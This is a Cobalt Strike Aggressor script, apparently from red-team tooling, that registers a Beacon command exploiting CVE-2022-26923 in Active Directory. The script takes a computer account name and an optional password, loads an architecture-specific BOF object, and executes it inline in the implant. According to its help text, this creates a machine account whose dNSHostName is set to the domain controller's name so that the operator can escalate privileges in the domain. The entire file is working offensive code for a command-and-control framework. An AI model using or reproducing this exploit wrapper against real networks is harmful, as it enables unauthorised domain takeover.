#author Cornelis de Plaa
#@outflank.nl

beacon_command_register("CVE-2022-26923", "Active Directory Domain Privilege Escalation exploit.",
    "Synopsis: CVE-2022-26923 [Computername] [Password <Optional>]\n\n" .
    "Use Active Directory Service Interfaces (ADSI) to add a computer account with dNSHostName attribute set to the DC fqdn.\n");

alias CVE-2022-26923 {
    $bid = $1;

    $input = substr($0, 15);
    @args = split(' ', $input);

    $accountname = @args[0];
    $password = @args[1];

    if ($accountname eq "") {
        berror($bid, "Specify a computeraccount name");
        return;
    }

    # Read in the right BOF file
    $handle = openf(script_resource("CVE-2022-26923." . barch($bid) . ".o"));
    $data   = readb($handle, -1);
    closef($handle);

    # Pack our arguments
    if ($password eq "") {
        $arg_data  = bof_pack($bid, "Z", $accountname);
    }
    else{
        $arg_data  = bof_pack($bid, "ZZ", $accountname, $password);
    }

    beacon_inline_execute($bid, $data, "go", $arg_data);
}
